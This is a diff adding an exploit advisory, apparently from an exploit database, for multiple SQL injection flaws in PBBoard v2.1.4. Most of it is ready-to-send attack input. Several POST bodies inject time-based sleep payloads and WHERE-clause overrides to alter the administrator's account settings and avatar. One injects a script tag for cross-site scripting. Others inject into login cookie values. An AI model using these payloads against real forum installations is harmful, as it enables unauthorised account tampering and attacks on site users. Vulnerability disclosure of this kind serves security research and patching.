@@ -1,0 +1,93 @@
+# Title: PBBoard v2.1.4 multiple SQLi Vulnerabilities
+# Version: 2.1.4
+# Author/Found by: loneferret
+# Software Site: http://www.pbboard.com/PBBoard_v2.1.4.zip
+# Other vulnerabilities: http://www.exploit-db.com/exploits/18937/
+  
+# Date found: May 29th 2012
+# Tested on: Ubuntu Server 8.04 / PHP Version 5.2.4-2ubuntu5.23
+  
+# Vulnerability:
+# Due to improper sanitization, many of the parameters are injectable.
+# Need a user account to trigger these.
+  
+# As always you can have fun...
+
+PoC:
+
+Page: Personal Options settings
+Parameters: style=
+			lang=
+			hide_online=
+			user_time=
+			send_allow=
+			pm_emailed=
+			pm_window=
+			visitormessage=
+Method: POST
+POST DATA:
+style=1&lang=1&hide_online=0&user_time=0&send_allow=1&pm_emailed=0&pm_window=1&visitormessage=2' where id='2' and sleep(5)#&send=Save
+
+By changing the 'id' number used in the 'where' clause, you can modify another user's settings.
+Id=1 being admin you can, for example, change his/her timezone 
+POST DATA:
+style=1&lang=1&
+hide_online=0&user_time=+10&
+send_allow=1&
+pm_emailed=0&
+pm_window=1&
+visitormessage=2' where id='1'#&send=Save
+
+Another thing, you can get an XSS using the MySQL's error message. Which is always funny.
+POST DATA:
+style=1&
+lang=1&
+hide_online=0
+&user_time=+10&
+send_allow=1&
+pm_emailed=0&
+pm_window=1&
+visitormessage=<script>alert('xss');</script>#&send=Save
+
+
+PoC #2:
+Here's another example, where we get mysql to sleep for 5 seconds, as well
+as change the admin's (id=1) avatar.
+
+Page: Change avatar
+Parameter: avatar_path=
+Method: POST
+POST DATA:
+-----------------------------68511802421187978011060806853\r\n
+Content-Disposition: form-data; name="options"\r\n
+\r\n
+list\r\n
+-----------------------------68511802421187978011060806853\r\n
+Content-Disposition: form-data; name="avatar_list"\r\n
+\r\n
+look/images/avatar/coof.jpg' where id='1' and sleep(5)#\r\n         <--Right Here
+-----------------------------68511802421187978011060806853\r\n
+Content-Disposition: form-data; name="avatar"\r\n
+\r\n
+http://\r\n
+-----------------------------68511802421187978011060806853\r\n
+Content-Disposition: form-data; name="upload"; filename=""\r\n
+Content-Type: application/octet-stream\r\n
+\r\n
+\r\n
+-----------------------------68511802421187978011060806853\r\n
+Content-Disposition: form-data; name="change_avatar"\r\n
+\r\n
+Edit Settings\r\n
+-----------------------------68511802421187978011060806853--\r\n
+
+PoC #3:
+SQLi in the cookie. Just need to modify the cookie value using
+your favorite tool.
+Parameter: PowerBB_username & PowerBB_password
+PowerBB_username=loneferret' and sleep(5)#
+or 
+PowerBB_password=e10adc3949ba59abbe56e057f20f883e' and sleep(5)#
+(and if you're wondering there are 58 fields)
+
+
